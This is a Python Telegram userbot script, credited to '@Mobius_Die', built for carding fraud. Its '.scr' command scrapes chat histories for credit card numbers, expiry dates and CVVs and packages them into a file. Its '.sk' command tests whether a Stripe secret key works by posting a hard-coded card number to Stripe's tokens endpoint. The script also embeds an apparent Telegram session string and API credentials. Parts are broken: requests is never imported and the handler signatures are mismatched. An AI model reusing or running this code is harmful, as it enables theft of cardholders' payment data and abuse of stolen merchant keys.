import re

import os

from SafoneAPI import SafoneAPI

from aiogram import *

from pyrogram import Client, filters



Safone = Client(

    os.getenv("SESSION_STRING", "BQDM7AgAhZB3zCRMUToEiXaQ8U77OhEYxOF68br0UUTohK6mlU2eG5Cgl3Evn0JKUy6_0EHyq3S8UDqRvprZGBRiOGOLe-vXjaYWnB06AuIatigtCOK7ds_Kcn1pohxkSzRG6TJ63q3OzEbHNO0pegPpXHEq7BjreT7MDUCD5Z2_Fo-FZPdjOFU35ot0YPyDKVEwC4lU-Rf4s3xckUAI6QUvQqvzJyNr-T1grd1GmdrnnnFxLVfeW2JtXVND6v-35Dzhb5lcOtD2zDv06hoPll6mIKVKaEZG4iNm5wDxakB6OvBSOcQIC0Y5C3zzfLOCMCh-8_U-lPinUMJBQlt31UPR79_L_QAAAAFNT7WpAA"),

    api_id=os.getenv("API_ID", "13429768"),

    api_hash=os.getenv("API_HASH", "63b6d07b85e038eae4183c2902c4347b"),

)

api = SafoneAPI

@Safone.on_message(filters.command("scr", "."))

async def cc_scrape_(c, m):

    try:

        chat = m.command[1]

        total = m.command[2]

    except BaseException:

        await m.reply("`Wrong Format!`")

    out = ""

    count = 0

    limit = int(total)

    k = await m.reply("`Scrapping... Please wait!`")

    async for msg in c.iter_history(chat, limit=limit):

            if not msg.text:

                continue

            for text in msg.text.split("\n"):

                pattern = re.findall(r"\b\d+\b", text)

                if len(pattern) >= 3 and len(pattern[0]) >= 7:

                        match = "|".join(list(pattern[:4]))

                        out += match + "\n"

                        count += 1

    file = f"x{count} CC Scrapped By @Mobius_Die.txt"

    caption = f"✅ **CC Scrapped Successfully!**\n\n**Source** -» `{chat}`\n**Amount** -» `{total}`\n**CC Found** -» `{count}`\n\n🥷🏻 **Scrapped By** -» {m.from_user.mention}\n❤️ **Developed By** -» @Mobius_Die👑"

    with open(file, "w+") as outfile:

        outfile.write(out)

    try:

        await m.reply_document(file, caption=caption)

        await k.delete()

        os.remove(file)

    except BaseException:

        await k.edit(f"❌ **No CC Found!**")



@Safone.on_message(filters.command("sk" , "."))
async def sh1(message: types.Message):
  await message.delete()
  await message.answer_chat_action("typing")
  user = message.text[len('/sk '):]
  data = 'card[number]=4512238502012742&card[exp_month]=12&card[exp_year]=2022&card[cvc]=354'
  first = requests.post('https://api.stripe.com/v1/tokens', data = data, auth = (user, ' '))
  status = first.status_code
  if status == 200:
      r_text = 'VALID API KEY ✅'
  else:
      if 'error' in first.json():
          if 'code' in first.json()['error']:
              r_res = first.json()['error']['code'].replace('_',' ').strip()
          else:
              r_res = 'INVALID API KEY'
      else:
          r_res = 'INVALID API KEY'
          
      r_text = '❌'+ r_res
  await message.answer(f""" 
{r_text} - <code>{user}</code>

<b>Checked by</b> -» <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
<b>Bot by </b> -» <a href="tg://user?id=5718648078"><b>Mobius Die</b></a>
          """)
